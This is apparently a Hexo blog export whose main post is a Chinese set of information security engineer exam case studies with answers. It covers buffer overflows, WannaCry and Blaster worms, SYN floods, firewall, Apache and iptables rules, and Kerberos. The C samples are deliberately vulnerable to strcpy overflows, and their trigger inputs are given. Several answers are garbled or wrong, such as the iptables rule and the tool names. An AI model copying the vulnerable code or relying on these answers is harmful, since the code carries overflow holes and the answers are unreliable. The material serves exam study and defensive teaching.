!= NULL)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		f.write(reinterpret_cast&lt;char*&gt;(&amp;current-&gt;e), sizeof(current-&gt;e));</span></span><br><span class="line"><span class="comment">//		current = current-&gt;next;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	f.close();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//void load()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	ifstream f(&quot;employee.dat&quot;, ios::in | ios::binary);</span></span><br><span class="line"><span class="comment">//	if (!f)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cerr &lt;&lt; &quot;open error!&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		abort();</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	Linklist current = new Node;</span></span><br><span class="line"><span class="comment">//	current-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//	Linklist H = current;</span></span><br><span class="line"><span class="comment">//	Linklist p = H;</span></span><br><span class="line"><span class="comment">//	bool flag = true;</span></span><br><span class="line"><span class="comment">//	while (f.read(reinterpret_cast&lt;char*&gt;(&amp;current-&gt;e), sizeof(current-&gt;e))) &#123;</span></span><br><span class="line"><span class="comment">//		flag = false;</span></span><br><span class="line"><span class="comment">//		p-&gt;next = current;</span></span><br><span class="line"><span class="comment">//		p = current;</span></span><br><span class="line"><span class="comment">//		Linklist newNode = new Node;</span></span><br><span class="line"><span class="comment">//		newNode-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//		current-&gt;next = newNode;</span></span><br><span class="line"><span class="comment">//		current = newNode;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	delete current;</span></span><br><span class="line"><span class="comment">//	p-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//	if (flag)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cout &lt;&lt; &quot;文件为空！&quot;;</span></span><br><span class="line"><span class="comment">//		exit(0);</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	f.close();</span></span><br><span class="line"><span class="comment">//	head-&gt;next = H;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>敬请T期待</title>
    <url>/2024/01/16/%E6%95%AC%E8%AF%B7T%E6%9C%9F%E5%BE%85/</url>
    <content><![CDATA[<h1 id="HEXO"><a href="#HEXO" class="headerlink" title="HEXO"></a>HEXO</h1><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO!"></a>HELLO!</h2><blockquote>
<p>敬请T期待</p>
</blockquote>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Begin</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全工程师</title>
    <url>/2024/10/25/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88-%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h1><h2 id="1-2017年"><a href="#1-2017年" class="headerlink" title="1-2017年"></a>1-2017年</h2><p>[说明]基于Windows32位系统分析下列代码，回答相关问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Challenge</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">9</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(temp,str,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp=%s\n&quot;</span>,temp);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(temp,<span class="string">&quot;Please!@&quot;</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;KEY:****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc，<span class="type">char</span> *argv[ ])</span></span><br><span class="line">&#123;</span><br><span class="line">    Char buf2[<span class="number">16</span>]</span><br><span class="line">    Int check=<span class="number">1</span>;</span><br><span class="line">    Char buf[<span class="number">8</span>]</span><br><span class="line">    Strcpy (buf2, <span class="string">&quot;give me key! !&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf，argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(check==<span class="number">65</span>) &#123;</span><br><span class="line">        Challenge(buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Check is not 65 (%d) \n Program terminated!!\n&quot;</span>，check)；</span><br><span class="line">    &#125;</span><br><span class="line">    Return <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>[问题 1](3 分)</p>
<blockquote>
<p> main 函数内的三个本地变量所在的内存区域称为什么?它的两个最基本操作是什么?</p>
<blockquote>
<p>动态存储区，分配存储空间和释放存储空间</p>
<p>（堆栈，压栈和出栈操作）</p>
</blockquote>
</blockquote>
<p><a href="3%E5%88%86">问题 2</a></p>
<blockquote>
<p>画出buf，check，buf2 三个变量在内存的布局图。</p>
<blockquote>
<p>需要画出变量的先后关系，每个变量所占空间，增长方向（数组）</p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/软考1.2.png" alt="1.2" style="zoom:50%;">
</blockquote>
</blockquote>
<p><a href="2%E5%88%86">问题 3</a></p>
<blockquote>
<p>应该给程序提供什么样的命令行参数值(通过argv[]变量传递)才能使程序执行流程进入判断语句If(check&#x3D;65)..然后调用challenge()函数。</p>
<blockquote>
<p>让argv[8]&#x3D;A</p>
</blockquote>
</blockquote>
<p><a href="4%E5%88%86">问题4</a></p>
<blockquote>
<p>上述代码所存在的漏洞名字是什么，针对本例 代码，请简要说明如何修正上述代码以修补此漏洞。</p>
<blockquote>
<p>缓冲区溢出漏洞</p>
<p>使用安全的 strcpy 函数，检测边界。</p>
</blockquote>
</blockquote>
<h2 id="2-2018试题一"><a href="#2-2018试题一" class="headerlink" title="2-2018试题一"></a>2-2018试题一</h2><p>阅读下列说明，回答问题1至问题4，将解答填入答题纸的对应栏内。</p>
<p>【说明】恶意代码是指为达到恶意目的专门设计的程序或者代码。常见的恶意代码类型有特洛伊木马、蠕虫、病毒、后门、rootkit、僵尸程序、广告软件。2017年5月,勒索软件wanacry席卷全球,国内大量高校及企事业单位的计算机被攻击,文件及数据被加密后无法使用,系统或服务无法正常运行,损失巨大。</p>
<p><a href="2%E5%88%86">问题1</a><br>按照恶意代码分类，此次爆发的恶意软件属于哪种类型?</p>
<blockquote>
<p>蠕虫</p>
</blockquote>
<p><a href="2%E5%88%86">问题2</a><br>此次勒索软件针对软件攻击目标是Windows还是Linux类系统?</p>
<blockquote>
<p>Windows系统</p>
</blockquote>
<p><a href="6%E5%88%86">问题3</a><br>恶意代码具有的共同特征是什么?</p>
<blockquote>
<ul>
<li>具有恶意的目的</li>
<li>自身是一个计算机程序</li>
<li>通过执行发生作用</li>
</ul>
</blockquote>
<p><a href="5%E5%88%86">问题4</a><br>由于此次勒索软件需要利用系统的SMB服务漏洞(端口号445)进行传播，我们可以配置防火墙过滤规则来阻止勒索软件的攻击，请填写表1-1中的空(1)-(5)，使该过滤规则完整。</p>
<p>注:假设本机ip地址为:1.2.3.4,”*”表示通配符。</p>
<table>
<thead>
<tr>
<th>规则号</th>
<th>源地址</th>
<th>目的地址</th>
<th>源端口</th>
<th>目的端口</th>
<th>协议</th>
<th>ACK</th>
<th>动作</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>(1)*</td>
<td>1.2.3.4</td>
<td>(2)1024</td>
<td>(3)445</td>
<td>(4)TCP</td>
<td>(5)*</td>
<td>拒绝</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
<td>…</td>
<td>…</td>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>…</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>拒绝</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BD%AF%E8%80%832.png" alt="软考2"></p>
<h2 id="3"><a href="#3" class="headerlink" title="3-"></a>3-</h2><p>阅读下列说明和图，回答问题</p>
<p>【说明】</p>
<p>如图1-1为某地方政府政务数据中心的拓扑图。其中对外服务器内部配置有虚拟化云平台，为办公区域和互联网提供相关政务服务。</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%9F%90%E5%9C%B0%E6%94%BF%E5%8A%A1%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="某地政务数据中心拓扑图"></p>
<p><a href="6%E5%88%86">问题1</a></p>
<p>1、按照等级保护2.0要求，该虚拟化平台的定级不应低于（1）级？需要（2）年测评一次。</p>
<blockquote>
<p>不应低于三级，需要一年测评一次；</p>
</blockquote>
<p>2、根据信安部门要求，需要正对虚拟化平台进行等级测评，结合该数据中心网络拓扑图，需要购置相关安全设备。</p>
<p>针对要求点“应在关键网网络节点检测、防止或限制从外部或内部部发起的网络攻击行为”选购的设备是(3):</p>
<blockquote>
<p>IDS或IPS</p>
</blockquote>
<p>针对要求点“应能对远程访问的用户行为、访问互联网的用户行为等单独进行行为审计和数据分析”选购的设备是(4);</p>
<blockquote>
<p>安全审计</p>
</blockquote>
<p>针对要求点“应对系统管理员进行身份鉴别，只允许其通过特定的命令或操作界面进行系统管理操作，并针对这些操作进行审计”选购的设备是(5):</p>
<blockquote>
<p>堡垒机（运维审计系统）</p>
</blockquote>
<p>针对要求点“应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞”选购的设备是(6)。</p>
<blockquote>
<p>漏洞扫描器</p>
</blockquote>
<p><a href="6%E5%88%86">问题2</a></p>
<p>按照网络安全测评购实施万式，测评丰要包挂安全功能检测安全管理检测、代码安全审查、安全渗透、信息系统攻干测计王工调说了部分后台处理代码，发现密码验证阶段存在安全漏洞，代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD<span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> verify <span class="title function_">password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated:</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);</span><br><span class="line">    <span class="keyword">return</span> authenticated:</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please input password:&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">		valid_flag=verify_password(password);</span><br><span class="line">		<span class="keyword">if</span>(valid_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(1)请问上述代码存在哪种漏洞?</p>
<blockquote>
<p>缓冲区溢出</p>
</blockquote>
<p>(2)为了进一步验证自己的判断，王工在密码输入时输入对应密码，发起测试。请问王工最有可能输入的密码是以下哪个选项?<br>A.1234567						B.12345678<br>C.2345678						D.7654321</p>
<blockquote>
<p>B</p>
</blockquote>
<p>(3)该类型漏洞带来的危害有哪些?</p>
<blockquote>
<p>程序崩溃并导致拒绝服务，跳转并且执行一段恶意代码。</p>
</blockquote>
<p>(4)预防该类型漏洞带来危害的手段有哪些?</p>
<blockquote>
<p>利用编译器的边界检查，来实现缓冲区的保护。在程序指针失效前进行完整性检查，通过操作系统使得缓冲区不可执行，从而阻止攻击者植入攻击代码，强制写正确的代码的方法。</p>
</blockquote>
<p><a href="4%E5%88%86">问题3</a></p>
<p>某日，网站管理员王工宝宝高网站访问慢，他查看了互联网接入区防火墙的日志。日志如图。</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E4%BA%92%E8%81%94%E7%BD%91%E6%8E%A5%E5%85%A5%E5%8C%BA%E9%98%B2%E7%81%AB%E5%A2%99%E6%97%A5%E5%BF%97.png" alt="互联网接入区防火墙日志"></p>
<p>（1）根据上述日志显示，可以判断该公司服务器遭受到（1）攻击。该攻击除了ACK Flooding之外还有例如（2）（3）（4）等多种方式。</p>
<blockquote>
<ol>
<li>DOS&#x2F;DDOS攻击</li>
<li>ICPM Flooding</li>
<li>UDP Flooding</li>
<li>Teardrop</li>
</ol>
</blockquote>
<p><a href="4%E5%88%86">问题4</a></p>
<p>​		该数据中心建设过程中严格博从《数据中心设计规范(GB50174-2017)》标准来建设，根据其中的强制条文中规定:数据中心的耐火等级不应低于(1)级。设置气体灭火系统的主机房，应配置专用(2)。</p>
<blockquote>
<ol>
<li>耐火等级不应低于二级</li>
<li>应该配置专用的氧气呼吸机或空气呼吸机</li>
</ol>
</blockquote>
<p>​		《数据中心设计规范(GB50174-2017)》中要求数据中心划分为A、B、C三级，该数据中心的电子信息系统运行中断将造成较大经济损失，那么该数据中心应定为(3)级</p>
<blockquote>
<p>B级</p>
</blockquote>
<h2 id="4"><a href="#4" class="headerlink" title="4-"></a>4-</h2><p>阅读下列说明和图，回答问题</p>
<p>【说明】</p>
<p>W32 Blaster.Worm网络攻击示意图如图所示</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/W32.Blaster.Worm%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="W32.Blaster.Worm网络攻击示意图"></p>
<p><a href="8%E5%88%86">问题1</a></p>
<p>(1)W32.Blaster.Worm利用的是什么漏洞?该漏洞对应的是TCP还是UDP的多少号端口?</p>
<blockquote>
<p>利用的是DOCM RPC漏洞，对应的是TCP的135端口</p>
</blockquote>
<p>(2)W32.Blaster.Worm利用tftp协议下载蠕虫代码，tftp工作在网络的那一层?</p>
<blockquote>
<p>tftp协议工作在网络的应用层</p>
</blockquote>
<p>(3)tftp工作在哪个传输层协议的多少号端口?</p>
<blockquote>
<p>tftp工作在UDP协议的69端口</p>
</blockquote>
<p>(4)该蠕虫病毒还将对windowsupdate.com进行什么攻击?</p>
<blockquote>
<p>拒绝服务攻击</p>
</blockquote>
<p><a href="2%E5%88%86">问题2</a></p>
<p>网络蠕虫的传播方法包括 <strong>随即扫描</strong>，<strong>顺序扫描</strong>，<strong>选择扫描</strong>，W32.Blaster是哪种传播方法的蠕虫？</p>
<blockquote>
<p>顺序扫描蠕虫</p>
</blockquote>
<p><a href="2%E5%88%86">问题3</a></p>
<p>在windows系统中，需要对主机的网络通信状态监测可以使用什么命令?</p>
<blockquote>
<p>netstat</p>
</blockquote>
<p><a href="6%E5%88%86">问题4</a></p>
<p>网络安全评估是对受害系统进行分析，获取受書系统的危害情况。针对恶意代码的检测、漏洞扫描、文件完整性检查等是进行网络安全评估的有效方法。<br>(1)常用的漏洞扫描工具有哪些?(至少写出一种)</p>
<blockquote>
<p>NAMP&#x2F;Nessus</p>
</blockquote>
<p>(2)在UNIX系统上，容易被感染特洛伊木马的二进制文件包括temnet、login、su等等，网络管理员可以使用什么命令直接把系统中的二进制文件和原始发布介质上的对应文件进行比较?</p>
<blockquote>
<p>cmp</p>
</blockquote>
<p>(3)在UNIXLinux系统中，通过utmp日志文件，可以确定当前哪些用户登录受害系统，并可以利用什么命令读出其中的信息?</p>
<blockquote>
<p>who</p>
<p>&#x2F;&#x2F;常用于UNIX&#x2F;linux的日志分析工具有grep、sed、awk、find等</p>
</blockquote>
<p><a href="2%E5%88%86">问题5</a></p>
<p>网络蠕虫传播抑制技术的基本原理是利用网络蠕虫的传播特点，来构造一个限制网络蠕虫传播的环境，现在，已有的网络鳔虫传播抑制技术主要基于什么技术?其技术方法是在网络系统设置虚拟机器或虚假漏洞，欺骗网络虫，导致虫的传播能力下降。</p>
<blockquote>
<p>蜜罐技术</p>
</blockquote>
<h2 id="5"><a href="#5" class="headerlink" title="5-"></a>5-</h2><p>阅读下列说明和图，回答问题。</p>
<p>【说明】<br>入侵检测系统(IDS)和入侵防护系统(IPS)是两种重要的网络安全防御手段，IDS注重的是网络安全状况的监管，IPS则注重对入侵行为的控制<br><a href="2%E5%88%86">问题1</a><br>网络安全防护可以分为主动防护和被动防护，请问IDS和IPS分别属于哪种防护?</p>
<blockquote>
<p>IDS入侵检测系统属于被动防护</p>
<p>IPS入侵防护系统属于主动防护</p>
</blockquote>
<p><a href="4%E5%88%86">问题2</a><br>入侵检测是动态安全模型(P2DR)的重要组成部分。请列举P2DR模型的4个主要组成部分。</p>
<blockquote>
<p>保护、检测、响应、安全策略</p>
</blockquote>
<p><a href="2%E5%88%86">问题3</a><br>假如某入侵检测系统记录了如图所示的网络数据包:</p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/网络数据包1.png" alt="网络数据包1" style="zoom: 67%;">

<p>请问图中的数据包属于哪种网络攻击?该攻击的具体名字是什么?</p>
<blockquote>
<p>拒绝服务攻击，SYN Flood攻击</p>
</blockquote>
<p><a href="4%E5%88%86">问题4</a><br>入侵检测系统常用的两种检测技术是异常检测和误用检测，请问针对图中所描述的网络攻击应该采用哪种检测技术?请简要说明原因。</p>
<blockquote>
<p>误用检测，SYN Flood攻击具有固定攻击行为，攻击特征明显。</p>
</blockquote>
<p><a href="3%E5%88%86">问题5</a><br>Snort是一款开源的网络入侵检测系统，它能够执行实时流量分析和IP协议网络的数据包记录。<br>Snort的配置有3种模式，请给出这3种模式的名字。</p>
<blockquote>
<p>嗅探、包记录、网络入侵检测</p>
</blockquote>
<h2 id="6"><a href="#6" class="headerlink" title="6-"></a>6-</h2><p>阅读下列说明和图，回答问题1至问题4,将解答填入答题纸的对应栏内。<br>【说明】云计算是一个T资源服务平台,承载着多种应用系统,存储了大量的数据资源,其安全性至关重要。云安全不仅关系企事业单位的正常运行,同时也涉及国家安全以及社会影响保障云计算系统的安全成为相关企事业单位开展云计算服务业务的基础。网络安全问题成为云计算服务发展的重要因素。</p>
<p><a href="3%E5%88%86">问题1</a><br>IT资源以一种服务产品的形式提供,满足用户按需使用、计量付费的要求。目前,云计算常见的服务有基础设施即服务laaS、(1)、(2)、(3)、存储即服务 STaaS.</p>
<blockquote>
<p>基础设施即服务LaaS</p>
<p>平台即服务PaaS</p>
<p>软件即服务SaaS</p>
<p>数据即服务DaaS</p>
<p>存储即服务STaaS</p>
</blockquote>
<p><a href="3%E5%88%86">问题2</a><br>敏感数据处理是数据安全的重要内容。数据库脱敏是指利用数据脱敏技术将数据库中的数据进行变换处理,在保持数据按需使用目标的同时,又能避免敏感数据外泄。常见的数据脱敏技术方法有屏蔽、变形、替换、随机、加密,使得敏感数据不泄露给非授权用户或系统。<br>1)证件号码数据4346645400205379经过(4)脱敏后，变成4346********5379;</p>
<blockquote>
<p>屏蔽</p>
</blockquote>
<p>2)(5)指对于完整的数据进行Hash计算后，使数据不可读。</p>
<blockquote>
<p>加密</p>
</blockquote>
<p>3)将表格中的所有手机号码经过(6)处理后，统一变成了“13777777777”</p>
<blockquote>
<p>替换</p>
</blockquote>
<p><a href="4%E5%88%86">问题3</a><br>身份鉴别认证机制解决云计算中各种身份标识及鉴别问题。云计算提供商通常使用户名&#x2F;口令认证。除此之外,云用户身份认证技术还有强制密码策略、多因子认证。Kerberos。其中Kerberos是一个网络认证协议。</p>
<p>1)-个Kerberos系统涉及客户机、(7)、(8)、应用服务器等四个基本实体。</p>
<blockquote>
<p>Kerberos系统涉及四个实体：</p>
<p>AS（认证服务器）：识别用户并提供TGS会话密钥</p>
<p>TGS（票据发放服务器）：为申请服务的用户授予票据（Ticket）</p>
<p>客户机：用来访问服务器设备</p>
<p>应用服务器：为用户提供服务的设备或系统</p>
</blockquote>
<p>2)Kerberos认证过程当中，客户机与KDC交换的信息中包含时间戳，时间戳的主要作用是什么？</p>
<blockquote>
<p>防止重放攻击</p>
</blockquote>
<p>3)Kerpers认证讨程具有(9)的优点,只要用户拿到了TGT并目该TGT没有过期,那么用户就可以使用该TGT通过TGS完成到任一服务器的认证过程而不必重新输入密码。</p>
<blockquote>
<p>单点登录</p>
</blockquote>
<p><a href="5%E5%88%86">问题4</a><br>云计算平台承载大量应用,其业务的安全持续运营至关重要。安全事件导致停机事件时有报道。为此,建立异构云容灾备份机制非常重要,工业界常采用”两地三中心”的容灾机制其中,两地是指(10)、(11);三中心是指(12)、(13)、(14)。</p>
<blockquote>
<p>两地：同城、异地</p>
<p>三中心：同城容灾中心、异地容灾中心、生产中心</p>
</blockquote>
<h2 id="7"><a href="#7" class="headerlink" title="7-"></a>7-</h2><p>阅读下列说明和图，回答问题1至问题4，将解答填入答题纸的对应栏内。<br>【说明】<br>某企业的网络拓扑图如图所示，图中，网站服务器的 IP 地址是192.168.70.140，邮件服务器的 IP 地址是192.168.70.141。从运营商获取固定地址202.114.58.22。李工是该企业的信息安全管理员。</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%9F%90%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="某企业网络拓扑图"></p>
<p><a href="5%E5%88%86">问题1</a><br>防火墙在该企业网络当中起到了众多防护功能，但是该网络依然存在的风险(防火墙的不足之处)包括哪些?</p>
<blockquote>
<ul>
<li>网络安全旁路。防火墙只能对通过它的网络通信进行访问控制，而未经过它的网络通信就无能为力。</li>
<li>防火墙安全机制形成单点故障或特权威胁。</li>
<li>防火墙不能防止感染病毒、防止后门攻击等功能缺陷，导致一些网络威胁无法阻断。</li>
<li>防火墙无法有效防范内部威胁。</li>
<li>防火墙受限于安全规则。防火墙依赖于安全规则的更新，特别是采用黑名单策略的防火墙，一旦安全规则跟新不及时，极易导致防火墙的保护功能失效。</li>
</ul>
</blockquote>
<p><a href="6%E5%88%86">问题2</a><br>包过滤是防火墙的基本功能之一，李工需要完成以下防火墙过滤规则的配置，才满足只允许外网与该企业的邮件服务器进行邮件服务相关通信，以及人事部门的上网需求，其他全部禁止。请完善下面的过滤规则。</p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/包过滤防火墙配置.png" alt="包过滤防火墙配置" style="zoom:67%;">

<blockquote>
<ol>
<li>110</li>
<li>143</li>
<li>25</li>
<li>192.168.12.0&#x2F;24    #人事部门的上网需求</li>
<li>允许</li>
<li>禁止</li>
</ol>
</blockquote>
<p><a href="4%E5%88%86">问题3</a></p>
<p>服务器上可以实现访问控制。Web服务器是Apache hto服务器，李工可以在(7)配置文件中设置以下访问控制，使得只有信息安全部的工作人员才可以访问lsecret目录资源。请完善以下配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Directory /full/path/to/(8)&gt;</span><br><span class="line">&lt;Limit GET POST&gt;</span><br><span class="line">Deny from(9)</span><br><span class="line">Allow from (10)</span><br><span class="line">&lt;/Limit&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>(7)access.conf</p>
<p>(8) secret</p>
<p>(9) all</p>
<p>(10)192.168.11.2</p>
</blockquote>
<p><a href="5%E5%88%86">问题4</a><br>Web服务器是Linux服务器，Linux服务器自带的防火墙iptabies来实现包过滤等功能，假设只能允许人事部的用户访问该服务器的web服务。李工可以使用命令(11)查看现有的过滤规则。规则如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target prot opt <span class="built_in">source</span> destination</span><br><span class="line">ACCEPT tcp--anywhere anywherestate NEW tcp dpt:netscript</span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target prot opt <span class="built_in">source</span> destination</span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">targetprot opt <span class="built_in">source</span> destination</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -L</span><br></pre></td></tr></table></figure>
</blockquote>
<p>1)从上述规则可知，iptables的默认规则并不符合web服务的安全要求，所以需要配置三条规则链，请写出这三条规则链</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -P FORWARD DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br></pre></td></tr></table></figure>

<p>题干所给的防火墙规则都是允许的，不符合要求，需要默认拒绝的规则链。</p>
</blockquote>
<p>2)请写出只能允许人事部的用户访问服务器的防火墙规则。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -a input -s 192.168.12.0/24 --drop 80 -j ACCEPT</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="8"><a href="#8" class="headerlink" title="8-"></a>8-</h2><p>阅读下列说明，回答问题1至问题5，将解答填入答题纸的对应栏内。<br>【说明】<br>下图为我国电子政务系统的架构示意图，主要有互联网、政务外网、政务内网构成，涉及到不同的安全等级的网络信息之间的交换,</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%94%B5%E5%AD%90%E6%94%BF%E5%8A%A1%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%9B%BE.png" alt="电子政务系统架构图"></p>
<p><a href="4%E5%88%86">问题1</a></p>
<p>1)国家管理政策文件明确指出，电子政务网络有政务内网和政务外网构成，两网之间(1)隔离，政务外网与互联网之间(2)隔离。</p>
<blockquote>
<p>两网之间 <strong>物理隔离</strong></p>
<p>政务外网与互联网之间 <strong>逻辑隔离</strong></p>
</blockquote>
<p>2)图2-1说是的设备①应该选用设备(3):设备应该选用设备(4)，<br>(3)-(4)备选答案:<br>A.交换机 B.路由器 C.防火墙 D.网闸E. 耦合器F. 集线器</p>
<blockquote>
<p>① C 防火墙</p>
<p>② D 网闸</p>
</blockquote>
<p><a href="4%E5%88%86">间题2</a><br>政务外网服务子各级完委、人大、政府、政协、法和检察说等政务部门时政务公用网络。在各单位需要成工信息安全管理机构，行使单位信息安全管理职能。各个单位应设立(5)领导小组,作为本单位信息安全工作的最高领导決策机构。设立信息安全管理岗位并明确职责,至少应包含安全主管和“三员”岗位,其中“三员”岗位中，(6)岗位职责包括信息系统安全监督和网络安全管理,沟通、协调和组织处理信息安全事件等;(7)岗位职责包括网络安全设备和服务器的配置、部署、运行维护和日常管理等工作;(8)岗位职责包括对安全、网络、系统、应用、数据库等管理人员的操作行为进行审计,监督信息安全制度执行情况。</p>
<blockquote>
<p>各个单位应设立 <strong>信息安全领导小组</strong></p>
<p>安全保密员岗位：管理</p>
<p>系统管理员岗位 ：配置</p>
<p>安全审计员岗位：审计</p>
</blockquote>
<p><a href="6%E5%88%86">问题3</a><br>审计是网络隔离技术的重要指标之一。网络流量数据获取是网络通信安全审计的关键技术，下图是通过交换机端口镜像，从网络流量采集设备通过图形化流量数据采集工具Wireshark采集的部分数据。</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/Wireshark%E9%83%A8%E5%88%86%E9%87%87%E9%9B%86%E6%95%B0%E6%8D%AE.png" alt="Wireshark部分采集数据"></p>
<p>1)由上图可知，数据流量都是基于那种传输层协议?针对的是那种应用层协议?</p>
<blockquote>
<p>基于传输层的TCP协议（传输层协议有TCP和UDP）</p>
<p>针对应用层的HTTP协议（图中的目的端口为80）</p>
</blockquote>
<p>2)可以基本判断流量异常，疑似针对什么服务器的何种攻击?</p>
<blockquote>
<p>针对Web服务器的SYN-Floodding攻击 </p>
</blockquote>
<p>3)在华为交换机上设置镜像端口的配置如下:</p>
<p>observe-port 1interface GigabitEthernet0&#x2F;0&#x2F;2</p>
<p>interface GigabitEthernet0&#x2F;0&#x2F;1</p>
<p>port-mirroring to observe-port 1 inbound&#x2F;outbound&#x2F;both</p>
<p>则下列说法正确的是哪个?<br>A.GigabitEthernet0&#x2F;0&#x2F;2是镜像端口<br>B.GigabitEthernet0&#x2F;0&#x2F;1是镜像端口<br>C.GigabitEthernet0&#x2F;0&#x2F;1是观察端口<br>D.GigabitEthernet0&#x2F;0&#x2F;2是隔离端口</p>
<blockquote>
<p>GigabitEthernet0&#x2F;0&#x2F;1 是镜像端口（prot-mirroring）</p>
<p>GigabitEthernet0&#x2F;0&#x2F;2  是观察端口（observe-port）</p>
</blockquote>
